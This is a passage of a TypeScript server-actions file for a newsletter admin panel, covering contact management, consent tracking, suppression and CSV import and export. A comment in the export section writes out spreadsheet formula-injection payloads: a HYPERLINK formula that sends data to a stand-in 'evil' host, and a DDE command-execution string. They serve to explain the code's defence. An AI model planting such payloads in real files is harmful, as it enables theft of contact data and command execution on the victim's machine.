"use server";
import { revalidatePath } from "next/cache";
import { createClient } from "@/lib/supabase/server";
import { logAudit } from "@/lib/services/audit";
import type { Client } from "@/lib/services/workspace";
import { SITE_URL } from "@/lib/site";
import { parseCsv } from "@/lib/services/csv";
import {
  AB_METRICS, AUTOMATION_TRIGGERS, LOCALES, SUPPRESSION_REASONS,
  toAudience, toSegmentRules, toUtm,
  type Audience, type AudienceBreakdown, type CampaignStatus,
  type Locale, type MailBlock, type SegmentRules, type Utm,
} from "@/lib/newsletter";
import {
  audienceBreakdown, contactsByIds, contactsForExport, ensureLinks, existingContactEmails,
  getCampaign, getContact, getGroup, getTemplate, listSteps, resolveSegment, snapshotRecipients,
  suppressedAmong,
  type CampaignRow, type ContactFilter, type ContactRow, type StepRow,
} from "@/lib/services/newsletter";
import { collectUrls, renderCampaign } from "@/lib/server/newsletter/render";
import { writeSettings } from "@/lib/server/newsletter/settings";
import { runWorkerBatch } from "@/lib/server/newsletter/worker";
import { readIntegrationSecrets, dispatchToken, type MailConfig } from "@/lib/server/integrations";
import { putSecret } from "@/lib/server/secret-store";
import { bulkMailer, type MailIdentity, type SmtpConfig } from "@/lib/server/mailer";

/**
 * EVERY WRITE THE NEWSLETTER MAKES.
 *
 * Thin wrappers, as the house rule requires and as app/actions/cms.ts already
 * demonstrates: establish who is asking, call the service, record what
 * happened, invalidate what is now stale. The security decision is NOT taken
 * here — it is taken by RLS, using the caller's own client, because every
 * newsletter table answers `is_admin()`. `requireAdmin` exists so an operator
 * gets a clean "not_admin" instead of a screen full of empty result sets.
 *
 * FOUR RULES RUN THROUGH THE WHOLE FILE, and each of them is a decision that
 * something else would get wrong.
 *
 * A CAMPAIGN THAT IS SENDING IS FROZEN. Every content write goes through
 * `editableCampaign`, which refuses status 'sending' with the error "sending".
 * Editing a subject halfway through a send does not change the messages
 * already accepted by the mail server; it only makes the report describe a
 * mail that half the list never received. Pause first, edit, resume.
 *
 * CONSENT ONLY EVER MOVES FORWARD. Nothing here can grant consent on somebody's
 * behalf retroactively, and nothing here silently revokes a recorded grant. The
 * import records WHO asserted consent and under which wording; a block writes a
 * suppression row and deliberately leaves the contact's consent history alone
 * (see `blockContactAction` for why that matters when the block is lifted).
 *
 * SUPPRESSION ALWAYS WINS, and it wins at the latest possible moment. These
 * actions never have to remember to check it: `newsletter_queue_claim` re-checks
 * consent, unsubscription and the suppression list on every single batch. What
 * this file adds is refusing to *create* a lie — an import will not mark a
 * suppressed address as consented, and a test send writes no rows at all.
 *
 * AND THE ERROR STRINGS ARE A CLOSED VOCABULARY. Every `error` returned here is
 * a key under `newsletter.err.*`. Exactly two are new — `state` and `builtin`,
 * declared in i18n-add.actions.json with the reasoning — because the nearest
 * existing keys would have said something untrue: "Brak uprawnień" to an admin
 * whose role is fine, "Nie znaleziono" about a campaign that plainly exists.
 * Everything else is mapped onto a key that already ships in all three
 * dictionaries; an untranslated error string reaches the operator as raw
 * English in a Polish panel, which is how a module stops looking finished.
 */

type Result<T = unknown> = { ok: true; data?: T } | { ok: false; error: string };

async function requireAdmin() {
  const supabase = await createClient();
  const { data: { user } } = await supabase.auth.getUser();
  if (!user) throw new Error("unauthenticated");
  const { data: profile } = await supabase.from("profiles").select("role").eq("id", user.id).maybeSingle();
  if (profile?.role !== "admin") throw new Error("not_admin");
  return { supabase, adminId: user.id };
}

/** Only the two thrown by `requireAdmin` survive as themselves; anything else
 *  becomes "generic" rather than leaking a database message into the panel. */
function message(e: unknown): string {
  const text = e instanceof Error ? e.message : "";
  return text === "not_admin" || text === "unauthenticated" ? text : "generic";
}

/* ── SHARED SHAPES ───────────────────────────────────────────────────────── */

const NL = "/admin/newsletter";
const PATHS = {
  dashboard: NL,
  contacts: `${NL}/kontakty`,
  groups: `${NL}/grupy`,
  campaigns: `${NL}/kampanie`,
  automations: `${NL}/automatyzacje`,
  templates: `${NL}/szablony`,
  analytics: `${NL}/analityka`,
  suppressions: `${NL}/wypisani`,
} as const;

/** Every screen a write can make stale, named once. The dashboard is on almost
 *  every list because its counters are the first thing an operator checks after
 *  doing anything at all. */
function invalidate(...paths: string[]) {
  for (const path of new Set(paths)) revalidatePath(path);
}

/** The same shape `newsletter_contacts_email_shape` enforces in the database,
 *  spelled once here so the panel can say "that is not an address" instead of
 *  surfacing a constraint violation. */
const EMAIL_RE = /^[^@\s]+@[^@\s.]+\.[^@\s]{2,}$/;

/** `newsletter_contacts_email_normalised` demands this exact normalisation, and
 *  the unique index is what makes `Test@Example.com ` and `test@example.com`
 *  one person across five different writers. */
const normEmail = (value: string): string => value.trim().toLowerCase();

const isEmail = (value: string): boolean => EMAIL_RE.test(value) && value.length <= 254;

const clean = (value: string | null | undefined, max: number): string | null => {
  const v = (value ?? "").trim().slice(0, max);
  return v || null;
};

const localeOf = (value: string | null | undefined): Locale =>
  (LOCALES as readonly string[]).includes((value ?? "").trim())
    ? ((value ?? "").trim() as Locale) : "pl";

const isUuid = (value: string): boolean =>
  /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(value.trim());

/** `newsletter_groups_key_shape`, again spelled here so "Klucz może zawierać…"
 *  can be shown next to the field rather than as a failed save. */
const GROUP_KEY_RE = /^[a-z][a-z0-9_-]{1,60}$/;

/**
 * A campaign that may still be edited, or the reason it may not.
 *
 * This is the single gate in front of every content write. 'sending' is the one
 * status that refuses, and it refuses with "sending" — a campaign that is
 * already being handed to the mail server cannot be made to describe itself
 * differently after the fact. A 'sent' campaign is still editable on purpose:
 * an operator fixing a typo in an archived draft before cloning it is a normal
 * thing to want, and nothing about it changes what was received.
 */
async function editableCampaign(
  supabase: Client, id: string,
): Promise<{ ok: true; campaign: CampaignRow } | { ok: false; error: string }> {
  if (!isUuid(id)) return { ok: false, error: "missing" };
  const campaign = await getCampaign(supabase, id);
  if (!campaign) return { ok: false, error: "missing" };
  if (campaign.status === "sending") return { ok: false, error: "sending" };
  return { ok: true, campaign };
}

/** Does this step actually say anything? A builder step with no blocks and an
 *  HTML step with an empty document are both "no message", and both have to be
 *  caught before a send rather than by the recipient. */
const stepHasBody = (step: Pick<StepRow, "editor" | "blocks" | "bodyHtml">): boolean =>
  step.editor === "html" ? step.bodyHtml.trim().length > 0 : step.blocks.length > 0;

/* ── CONTACTS ────────────────────────────────────────────────────────────── */

export type ContactInput = {
  email: string;
  firstName?: string | null;
  lastName?: string | null;
  locale?: string;
  sourceKey?: string;
  tags?: string[];
  /** An assertion by the operator that this person agreed. It is stored with
   *  the wording version and the source, because "they said yes" with no record
   *  of when or to what is not a consent record, it is a claim. */
  marketingConsent?: boolean;
  consentVersion?: string | null;
  /** Static groups to drop the contact into immediately. */
  groupIds?: string[];
};

/**
 * Add one contact by hand.
 *
 * SUPPRESSION IS NOT OVERRIDDEN AND NOT SILENTLY IGNORED. If the address is on
 * the suppression list the contact is still created — an operator may genuinely
 * need the row — but `marketing_consent` is forced to false and the result says
 * `suppressed: true`, so the panel can tell the operator why the contact they
 * just marked as consenting shows no consent. Creating it with consent = true
 * and letting the queue quietly drop every message would be the same outcome
 * with none of the explanation.
 */
export async function createContactAction(input: ContactInput): Promise<Result<{ id: string; suppressed: boolean }>> {
  try {
    const { supabase, adminId } = await requireAdmin();
    const email = normEmail(input.email ?? "");
    if (!isEmail(email)) return { ok: false, error: "email" };

    const { data: clash } = await supabase
      .from("newsletter_contacts").select("id").eq("email", email).maybeSingle();
    if (clash) return { ok: false, error: "taken" };

    const suppressed = (await suppressedAmong(supabase, [email])).has(email);
    const consent = input.marketingConsent === true && !suppressed;
    const now = new Date().toISOString();

    const { data: created, error } = await supabase.from("newsletter_contacts").insert({
      email,
      first_name: clean(input.firstName, 120),
      last_name: clean(input.lastName, 120),
      locale: localeOf(input.locale),
      source_key: clean(input.sourceKey, 60) ?? "manual",
      tags: (input.tags ?? []).map((t) => t.trim()).filter(Boolean).slice(0, 20),
      marketing_consent: consent,
      // The database's own coherence check refuses consent without a date, and
      // it is right to: a grant nobody can place in time is not evidence.
      consent_at: consent ? now : null,
      consent_source: consent ? "manual" : null,
      consent_version: consent ? (clean(input.consentVersion, 40) ?? "v1") : null,
      created_by: adminId,
    }).select("id").single();
    if (error || !created) {
      return { ok: false, error: error?.code === "23505" ? "taken" : "generic" };
    }

    await addToGroups(supabase, [created.id], input.groupIds ?? []);

    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.contact_created",
      entityType: "newsletter_contact", entityId: created.id,
      after: { email, consent, suppressed },
    });
    invalidate(PATHS.contacts, PATHS.dashboard, PATHS.groups);
    return { ok: true, data: { id: created.id, suppressed } };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/**
 * Edit a contact.
 *
 * THE ADDRESS IS NOT EDITABLE HERE, and that is deliberate rather than an
 * oversight. `unsubscribe_token` is bound to a person, suppression is keyed on
 * the ADDRESS, and queued recipient rows carry a frozen copy of it. Letting an
 * operator retype the address turns one person into two half-people across
 * three tables. A wrong address is deleted and re-added.
 *
 * CONSENT CAN BE WITHDRAWN HERE AND NEVER INVENTED. Turning the switch off
 * records the withdrawal; turning it on when there was no prior grant records a
 * new one, dated now, sourced to the panel and attributed in the audit log to
 * the admin who did it. An existing, earlier grant is never overwritten with a
 * newer date — the original date is the one with legal meaning.
 *
 * AND IT CANNOT UNDO SOMEBODY'S UNSUBSCRIBE. Granting consent here clears
 * `unsubscribed_at`, but `newsletter_unsubscribe` also wrote a SUPPRESSION row
 * keyed on the address, and `newsletter_queue_claim` re-checks that list on
 * every batch. So an admin who flips this switch for somebody who opted out
 * changes the flag and nothing else: to actually mail them again they must also
 * lift the suppression, deliberately, in a second place. That extra step is the
 * feature — "put me back on the list" should take two decisions, not one
 * mis-click on a contact screen.
 */
export async function updateContactAction(input: {
  id: string;
  firstName?: string | null;
  lastName?: string | null;
  locale?: string;
  sourceKey?: string;
  tags?: string[];
  marketingConsent?: boolean;
  consentVersion?: string | null;
}): Promise<Result> {
  try {
    const { supabase, adminId } = await requireAdmin();
    if (!isUuid(input.id)) return { ok: false, error: "missing" };

    const { data: before } = await supabase.from("newsletter_contacts")
      .select("email, marketing_consent, consent_at, consent_source, consent_version")
      .eq("id", input.id).maybeSingle();
    if (!before) return { ok: false, error: "missing" };

    const patch: Record<string, unknown> = {
      first_name: clean(input.firstName, 120),
      last_name: clean(input.lastName, 120),
      locale: localeOf(input.locale),
    };
    const source = clean(input.sourceKey, 60);
    if (source) patch.source_key = source;
    if (input.tags) {
      patch.tags = input.tags.map((t) => t.trim()).filter(Boolean).slice(0, 20);
    }

    if (typeof input.marketingConsent === "boolean") {
      const now = new Date().toISOString();
      if (input.marketingConsent) {
        patch.marketing_consent = true;
        // Already consenting → keep the original record untouched.
        if (!before.marketing_consent) {
          patch.consent_at = now;
          patch.consent_source = "admin";
          patch.consent_version = clean(input.consentVersion, 40) ?? "v1";
        }
        // Re-granting consent is an affirmative act and clears the
        // unsubscription, exactly as a re-subscribe through the public function
        // does. The suppression row, if any, still holds.
        patch.unsubscribed_at = null;
      } else {
        patch.marketing_consent = false;
      }
    }

    const { error } = await supabase.from("newsletter_contacts")
      .update(patch as never).eq("id", input.id);
    if (error) return { ok: false, error: "generic" };

    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.contact_updated",
      entityType: "newsletter_contact", entityId: input.id,
      before: { consent: before.marketing_consent },
      after: { consent: patch.marketing_consent ?? before.marketing_consent },
    });
    invalidate(PATHS.contacts, `${PATHS.contacts}/${input.id}`, PATHS.dashboard);
    return { ok: true };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/**
 * Delete a contact outright.
 *
 * THIS IS THE DESTRUCTIVE ONE AND THE PANEL SHOULD SAY SO. `newsletter_events`,
 * `newsletter_recipients` and the group memberships all cascade from this row,
 * so deleting a contact erases the record that they were ever written to, along
 * with every open and click. If the goal is "stop mailing this person",
 * `blockContactAction` is the right tool: it is reversible and it keeps the
 * history that proves what was sent.
 */
export async function deleteContactAction(id: string): Promise<Result> {
  try {
    const { supabase, adminId } = await requireAdmin();
    if (!isUuid(id)) return { ok: false, error: "missing" };
    const { data: before } = await supabase.from("newsletter_contacts")
      .select("email").eq("id", id).maybeSingle();
    if (!before) return { ok: false, error: "missing" };

    const { error } = await supabase.from("newsletter_contacts").delete().eq("id", id);
    if (error) return { ok: false, error: "generic" };

    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.contact_deleted",
      entityType: "newsletter_contact", entityId: id,
      before: { email: before.email },
    });
    invalidate(PATHS.contacts, PATHS.dashboard, PATHS.groups);
    return { ok: true };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/**
 * Stop mailing somebody, without destroying the record that they consented.
 *
 * WHY THE CONTACT ROW IS LEFT ALONE. It would be easy to also set
 * `marketing_consent = false` here, and it would be wrong. The suppression
 * table is keyed on the ADDRESS and is checked inside `newsletter_queue_claim`
 * on every batch, so writing that one row is already sufficient to guarantee
 * nothing is ever sent. Flipping the consent flag as well would destroy the
 * dated grant — and then `removeSuppressionAction` could not restore the person
 * to where they were, because the evidence of their consent would be gone.
 * A block is an operator's decision about an address; consent is a record of
 * something the contact did. The two do not get to overwrite each other.
 *
 * AND AN EXISTING SUPPRESSION IS NOT OVERWRITTEN. `ignoreDuplicates` rather
 * than a real upsert: if the address is already on the list because the person
 * unsubscribed themselves, that reason is the true one and blocking them again
 * adds nothing but would erase it. The address ends up suppressed either way,
 * which is the only outcome that has to be guaranteed.
 *
 * Anything already queued is cancelled here, because "blocked from now on"
 * has to include the twelve messages of a sequence that are already rows.
 */
export async function blockContactAction(input: {
  contactId: string;
  reason?: string;
  note?: string | null;
}): Promise<Result> {
  try {
    const { supabase, adminId } = await requireAdmin();
    if (!isUuid(input.contactId)) return { ok: false, error: "missing" };
    const { data: contact } = await supabase.from("newsletter_contacts")
      .select("email").eq("id", input.contactId).maybeSingle();
    if (!contact) return { ok: false, error: "missing" };

    const reason = (SUPPRESSION_REASONS as readonly string[]).includes(input.reason ?? "")
      ? (input.reason as string) : "blocked";

    const { error } = await supabase.from("newsletter_suppressions").upsert({
      email: contact.email as string,
      reason,
      note: clean(input.note, 200),
      created_by: adminId,
    }, { onConflict: "email", ignoreDuplicates: true });
    if (error) return { ok: false, error: "generic" };

    await supabase.from("newsletter_recipients")
      .update({ status: "cancelled" } as never)
      .eq("contact_id", input.contactId)
      .in("status", ["pending", "sending"]);

    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.contact_blocked",
      entityType: "newsletter_contact", entityId: input.contactId,
      after: { email: contact.email, reason },
    });
    invalidate(PATHS.contacts, `${PATHS.contacts}/${input.contactId}`, PATHS.suppressions, PATHS.dashboard);
    return { ok: true };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/* ── BULK GROUP MEMBERSHIP ───────────────────────────────────────────────── */

/** Shared by the import and the manual add. Chunked because a 5 000-contact
 *  import otherwise builds one insert statement nobody should have to debug. */
async function addToGroups(supabase: Client, contactIds: string[], groupIds: string[]) {
  const groups = groupIds.filter(isUuid).slice(0, 20);
  if (groups.length === 0 || contactIds.length === 0) return;
  const rows = groups.flatMap((group_id) => contactIds.map((contact_id) => ({ group_id, contact_id })));
  for (let i = 0; i < rows.length; i += 500) {
    await supabase.from("newsletter_group_members")
      .upsert(rows.slice(i, i + 500), { onConflict: "group_id,contact_id", ignoreDuplicates: true });
  }
}

/**
 * Put the selected contacts into a static group.
 *
 * A DYNAMIC GROUP IS REFUSED, WITH "missing", AND THE WORD IS ACCURATE. A
 * segment has no membership rows at all — it is a saved filter recomputed on
 * every use — so there is no list here to add anybody to. "Nie znaleziono" is
 * literally what happened: no static group with that id exists. Reporting
 * "generic" instead would tell the operator to try again, which would fail
 * again, forever.
 */
export async function bulkAddToGroupAction(input: {
  contactIds: string[];
  groupId: string;
}): Promise<Result<{ added: number }>> {
  try {
    const { supabase, adminId } = await requireAdmin();
    const ids = input.contactIds.filter(isUuid).slice(0, 5000);
    if (ids.length === 0) return { ok: false, error: "missing" };
    const group = await getGroup(supabase, input.groupId);
    if (!group || group.isDynamic) return { ok: false, error: "missing" };

    await addToGroups(supabase, ids, [group.id]);
    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.group_bulk_add",
      entityType: "newsletter_group", entityId: group.id,
      after: { contacts: ids.length },
    });
    invalidate(PATHS.contacts, PATHS.groups);
    return { ok: true, data: { added: ids.length } };
  } catch (e) { return { ok: false, error: message(e) }; }
}

export async function bulkRemoveFromGroupAction(input: {
  contactIds: string[];
  groupId: string;
}): Promise<Result<{ removed: number }>> {
  try {
    const { supabase, adminId } = await requireAdmin();
    const ids = input.contactIds.filter(isUuid).slice(0, 5000);
    if (ids.length === 0) return { ok: false, error: "missing" };
    const group = await getGroup(supabase, input.groupId);
    if (!group || group.isDynamic) return { ok: false, error: "missing" };

    for (let i = 0; i < ids.length; i += 400) {
      const { error } = await supabase.from("newsletter_group_members")
        .delete().eq("group_id", group.id).in("contact_id", ids.slice(i, i + 400));
      if (error) return { ok: false, error: "generic" };
    }
    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.group_bulk_remove",
      entityType: "newsletter_group", entityId: group.id,
      after: { contacts: ids.length },
    });
    invalidate(PATHS.contacts, PATHS.groups);
    return { ok: true, data: { removed: ids.length } };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/* ── CSV IMPORT ──────────────────────────────────────────────────────────── */

/**
 * CSV COLUMN MATCHING, in Polish and English, diacritics folded.
 *
 * An operator's export from their shop, their accountant or Mailchimp does not
 * have the headers this module would have chosen. Matching on a small alias
 * list is the difference between "import" and "first rename your columns".
 */
const FOLD: Record<string, string> = {
  ą: "a", ć: "c", ę: "e", ł: "l", ń: "n", ó: "o", ś: "s", ź: "z", ż: "z",
};
const normHeader = (value: string): string =>
  value.toLowerCase().replace(/[ąćęłńóśźż]/g, (c) => FOLD[c] ?? c).replace(/[^a-z0-9]/g, "");

const HEADER_ALIASES = {
  email: ["email", "emailaddress", "mail", "adres", "adresemail", "eadres"],
  firstName: ["firstname", "first", "imie", "name", "nazwa", "vorname", "givenname"],
  lastName: ["lastname", "last", "nazwisko", "surname", "familyname", "nachname"],
  locale: ["locale", "lang", "language", "jezyk", "sprache"],
  tags: ["tags", "tagi", "keywords", "labels"],
} as const;

type ImportColumn = keyof typeof HEADER_ALIASES;

type ParsedContact = {
  line: number;
  email: string;
  firstName: string | null;
  lastName: string | null;
  locale: Locale;
  tags: string[];
};

type ImportScan = {
  rows: ParsedContact[];
  /** Data lines whose address was missing or malformed. */
  invalid: number;
};

/**
 * Turn CSV text into candidate contacts.
 *
 * TWO THINGS THIS DOES THAT A NAIVE SPLIT WOULD NOT.
 *
 * It reuses `parseCsv` from the product importer rather than growing a second
 * parser — quoted fields, escaped quotes, CRLF and a sniffed delimiter
 * (Excel in a Polish locale writes semicolons) are already solved there, and
 * two parsers means two behaviours for the same file.
 *
 * And it survives a HEADERLESS file. `parseCsv` always treats line one as
 * headers; a file that is just a column of addresses would therefore lose its
 * first address silently — the worst possible failure, because the operator has
 * no way to notice. So if the header row itself looks like an address, it is
 * put back as data and the columns are read positionally.
 */
function scanImport(text: string): ImportScan {
  const parsed = parseCsv(text.slice(0, 5_000_000));
  const headers = parsed.headers;
  let rows = parsed.rows;
  let mapping: Partial<Record<ImportColumn, number>> = {};

  const headerIsData = headers.some((h) => isEmail(normEmail(h)));
  if (headerIsData) {
    rows = [headers, ...rows];
    mapping = { email: 0, firstName: 1, lastName: 2 };
  } else {
    const used = new Set<number>();
    for (const column of Object.keys(HEADER_ALIASES) as ImportColumn[]) {
      const aliases = HEADER_ALIASES[column] as readonly string[];
      const index = headers.findIndex((h, i) => !used.has(i) && aliases.includes(normHeader(h)));
      if (index >= 0) { mapping[column] = index; used.add(index); }
    }
    // No column called anything like "email"? Fall back to the first column
    // whose first non-empty value actually is one, so a file with an exotic
    // header still imports instead of reporting every row invalid.
    if (mapping.email === undefined) {
      const guess = headers.findIndex((_, i) => rows.some((r) => isEmail(normEmail(r[i] ?? ""))));
      if (guess >= 0) mapping.email = guess;
    }
  }

  const at = (cells: string[], column: ImportColumn): string => {
    const index = mapping[column];
    return index === undefined ? "" : (cells[index] ?? "").trim();
  };

  const out: ParsedContact[] = [];
  let invalid = 0;
  rows.forEach((cells, i) => {
    const email = normEmail(at(cells, "email"));
    if (!isEmail(email)) { invalid += 1; return; }
    out.push({
      line: i + (headerIsData ? 1 : 2),
      email,
      firstName: clean(at(cells, "firstName"), 120),
      lastName: clean(at(cells, "lastName"), 120),
      locale: localeOf(at(cells, "locale")),
      // One cell, several tags. Comma is already the delimiter more often than
      // not, so the separators here are the ones that survive a CSV round trip.
      tags: at(cells, "tags").split(/[|;]/).map((t) => t.trim()).filter(Boolean).slice(0, 20),
    });
  });
  return { rows: out, invalid };
}

export type ImportPreview = {
  /** Data lines read, valid or not. */
  total: number;
  /** Addresses that would become new contacts. */
  valid: number;
  /** Addresses this module already has, plus repeats inside the file itself. */
  duplicates: number;
  /** Lines with no usable address. */
  invalid: number;
  /** On the suppression list — these are never imported, whatever the file
   *  claims about consent. Shown separately so the count adds up on screen. */
  suppressed: number;
  /** The first few rows, so the operator can see the columns were read the way
   *  they meant them before committing anything. */
  sample: { email: string; firstName: string | null; lastName: string | null; locale: string }[];
};

/**
 * Read a CSV and report what committing it would do. Writes nothing.
 *
 * The preview exists because an import is the one operation in this module that
 * an operator cannot undo by clicking something. Knowing "1 240 new, 88 already
 * here, 3 unreadable, 2 blocked" BEFORE the write is what makes the write safe
 * to make.
 */
export async function previewImportAction(input: { csv: string }): Promise<Result<ImportPreview>> {
  try {
    const { supabase } = await requireAdmin();
    const scan = scanImport(input.csv ?? "");

    const seen = new Set<string>();
    const unique: ParsedContact[] = [];
    let repeats = 0;
    for (const row of scan.rows) {
      if (seen.has(row.email)) { repeats += 1; continue; }
      seen.add(row.email);
      unique.push(row);
    }

    const emails = unique.map((r) => r.email);
    const [known, blocked] = await Promise.all([
      existingContactEmails(supabase, emails),
      suppressedAmong(supabase, emails),
    ]);

    let valid = 0, duplicates = repeats, suppressed = 0;
    for (const row of unique) {
      if (blocked.has(row.email)) { suppressed += 1; continue; }
      if (known.has(row.email)) { duplicates += 1; continue; }
      valid += 1;
    }

    return {
      ok: true,
      data: {
        total: scan.rows.length + scan.invalid,
        valid,
        duplicates,
        invalid: scan.invalid,
        suppressed,
        sample: unique.slice(0, 20).map((r) => ({
          email: r.email, firstName: r.firstName, lastName: r.lastName, locale: r.locale,
        })),
      },
    };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/**
 * Commit an import.
 *
 * WHAT `consent` MEANS HERE. It is the operator asserting, on the record, that
 * the people in this file agreed to be marketed to — and the assertion is
 * stored as a consent record with a source of "import", the wording version
 * they name, and the admin's id in the audit log. It is NOT inferred from the
 * file having addresses in it. Left false, the contacts land with no consent and
 * no campaign will ever reach them, which is the correct outcome for a list
 * somebody bought or scraped.
 *
 * AN EXISTING CONTACT IS NEVER DOWNGRADED, and never re-dated. A re-import may
 * fill in a missing first name and may GRANT consent to somebody who had none;
 * it can neither revoke consent nor move an older grant's date forward. That
 * mirrors `newsletter_subscribe` exactly, because a CSV and a form are two
 * doors into the same table and must not disagree about what they do.
 *
 * AND A SUPPRESSED ADDRESS IS SKIPPED ENTIRELY. Not imported-without-consent:
 * skipped. Somebody who asked to be left alone does not reappear as a row in a
 * list an operator is looking at while choosing an audience.
 */
export async function commitImportAction(input: {
  csv: string;
  sourceKey?: string;
  groupIds?: string[];
  consent?: boolean;
  consentVersion?: string | null;
}): Promise<Result<{ created: number; updated: number; skipped: number }>> {
  try {
    const { supabase, adminId } = await requireAdmin();
    const scan = scanImport(input.csv ?? "");
    if (scan.rows.length === 0) return { ok: false, error: "email" };

    const seen = new Set<string>();
    const unique = scan.rows.filter((r) => (seen.has(r.email) ? false : (seen.add(r.email), true)));
    const emails = unique.map((r) => r.email);
    const [known, blocked] = await Promise.all([
      existingContactEmails(supabase, emails),
      suppressedAmong(supabase, emails),
    ]);

    const consent = input.consent === true;
    const consentVersion = clean(input.consentVersion, 40) ?? "v1";
    const sourceKey = clean(input.sourceKey, 60) ?? "import";
    const now = new Date().toISOString();

    const fresh = unique.filter((r) => !blocked.has(r.email) && !known.has(r.email));
    const existing = unique.filter((r) => !blocked.has(r.email) && known.has(r.email));
    // Everything that will not become a NEW contact, counted so the three
    // numbers the operator sees add up to the file they handed over:
    // suppressed + unreadable lines + addresses repeated inside the file.
    // Rows lost to an insert race are added below, once it is known.
    const suppressedRows = unique.length - fresh.length - existing.length;
    const repeatRows = scan.rows.length - unique.length;

    const createdIds: string[] = [];
    for (let i = 0; i < fresh.length; i += 500) {
      const { data, error } = await supabase.from("newsletter_contacts").insert(
        fresh.slice(i, i + 500).map((r) => ({
          email: r.email,
          first_name: r.firstName,
          last_name: r.lastName,
          locale: r.locale,
          source_key: sourceKey,
          tags: r.tags,
          marketing_consent: consent,
          consent_at: consent ? now : null,
          consent_source: consent ? "import" : null,
          consent_version: consent ? consentVersion : null,
          created_by: adminId,
        })),
      ).select("id");
      // A chunk that collides with a contact created between the scan and now
      // is a race, not a corruption: the rest of the file still imports.
      if (error) continue;
      for (const row of data ?? []) createdIds.push(row.id as string);
    }

    // ── EXISTING CONTACTS: fill the gaps, move consent forward, nothing else.
    //
    // ONE BATCHED WRITE PER CONCERN, not three per row. Re-importing the same
    // 5 000-line file is a completely normal thing for an operator to do, and
    // it must not turn into fifteen thousand round trips. Names are the only
    // part that genuinely varies per contact, and even those are written only
    // where the column is actually empty — which is read once, up front.
    const existingIds = existing
      .map((r) => known.get(r.email)).filter((v): v is string => Boolean(v));

    const gaps = new Map<string, { first: boolean; last: boolean }>();
    for (let i = 0; i < existingIds.length; i += 400) {
      const { data } = await supabase.from("newsletter_contacts")
        .select("id, first_name, last_name")
        .in("id", existingIds.slice(i, i + 400));
      for (const r of data ?? []) {
        gaps.set(r.id as string, { first: r.first_name === null, last: r.last_name === null });
      }
    }

    // Which contacts this import actually changed. A row the file repeats
    // verbatim changed nothing and is reported as skipped, not as updated.
    const touched = new Set<string>();
    for (const row of existing) {
      const id = known.get(row.email);
      const gap = id ? gaps.get(id) : undefined;
      if (!id || !gap) continue;
      const patch: { first_name?: string; last_name?: string } = {};
      // A name somebody typed for themselves is never replaced by one from a
      // stale file. Only a genuinely empty column is filled.
      if (row.firstName && gap.first) patch.first_name = row.firstName;
      if (row.lastName && gap.last) patch.last_name = row.lastName;
      if (Object.keys(patch).length === 0) continue;
      const { error } = await supabase.from("newsletter_contacts")
        .update(patch as never).eq("id", id);
      if (!error) touched.add(id);
    }

    if (consent) {
      // `.eq("marketing_consent", false)` is what makes this move consent
      // FORWARD only: a contact who already agreed keeps their original date,
      // source and wording version, which are the parts with legal meaning.
      for (let i = 0; i < existingIds.length; i += 400) {
        const { data } = await supabase.from("newsletter_contacts").update({
          marketing_consent: true,
          consent_at: now,
          consent_source: "import",
          consent_version: consentVersion,
          unsubscribed_at: null,
        } as never)
          .in("id", existingIds.slice(i, i + 400))
          .eq("marketing_consent", false)
          .select("id");
        for (const r of data ?? []) touched.add(r.id as string);
      }
    }
    const updated = touched.size;

    const memberIds = [...createdIds, ...existingIds];
    await addToGroups(supabase, memberIds, input.groupIds ?? []);

    // created + updated + skipped equals the number of data lines in the file,
    // exactly. A report whose parts do not add up to the whole teaches an
    // operator to distrust the importer, and then to import twice.
    const skipped = suppressedRows + repeatRows + scan.invalid
      // Rows whose insert lost a race against a concurrent public signup.
      + (fresh.length - createdIds.length)
      // Contacts the file named but did not change.
      + (existing.length - updated);

    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.contacts_imported",
      entityType: "newsletter_contact",
      after: {
        created: createdIds.length, updated, skipped,
        consent, consentVersion: consent ? consentVersion : null, sourceKey,
      },
    });
    invalidate(PATHS.contacts, PATHS.groups, PATHS.dashboard);
    return { ok: true, data: { created: createdIds.length, updated, skipped } };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/* ── CSV EXPORT ──────────────────────────────────────────────────────────── */

/**
 * ONE CELL, MADE SAFE TO OPEN IN A SPREADSHEET.
 *
 * A cell beginning with `=`, `+`, `-`, `@`, a tab or a carriage return is not
 * data to Excel, LibreOffice or Google Sheets — it is a FORMULA, evaluated the
 * moment the operator opens the file. `=HYPERLINK("https://evil/"&A1,"Click")`
 * in a first-name field is a contact-list exfiltration that costs an attacker
 * one public signup form and costs us the whole list. Older Excel would even
 * run `=cmd|'/c calc'!A0`.
 *
 * Every value in this file came from a public form, so every value is hostile
 * input. The leading apostrophe is the standard neutralisation: the spreadsheet
 * shows the text and evaluates nothing. Quoting alone does NOT do this — a
 * quoted CSV field is still parsed as a formula after the quotes come off,
 * which is precisely the mistake the existing waitlist export makes and which
 * this one deliberately does not inherit.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

function csvCell(value: unknown): string {
  const raw = value === null || value === undefined ? "" : String(value);
  const guarded = FORMULA_LEAD.test(raw) ? `'${raw}` : raw;
  return `"${guarded.replace(/"/g, '""')}"`;
}

const EXPORT_COLUMNS = [
  "email", "first_name", "last_name", "locale", "source", "tags",
  "marketing_consent", "consent_at", "consent_source", "consent_version",
  "unsubscribed_at", "created_at", "last_activity_at", "last_sent_at",
] as const;

/**
 * The filtered list as CSV.
 *
 * Built on the server from the whole filtered set rather than from whatever
 * page the operator was looking at, and capped at 50 000 rows — `truncated`
 * says when the cap was hit, because a silently short export is a file somebody
 * will treat as the complete list.
 */
export async function exportContactsCsvAction(
  filter: ContactFilter = {},
): Promise<Result<{ csv: string; rows: number; truncated: boolean }>> {
  try {
    const { supabase, adminId } = await requireAdmin();
    const LIMIT = 50_000;
